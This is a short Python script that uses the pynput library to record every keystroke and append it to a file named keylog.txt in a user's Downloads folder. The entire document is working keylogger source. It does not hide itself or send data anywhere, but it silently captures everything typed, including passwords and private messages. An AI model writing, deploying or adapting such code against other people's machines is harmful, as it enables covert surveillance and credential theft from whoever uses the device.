from pynput.keyboard import Listener

# Set a known path like Downloads
log_file = "C:/Users/sarab/Downloads/keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")

with Listener(on_press=on_press) as listener:
    listener.join()
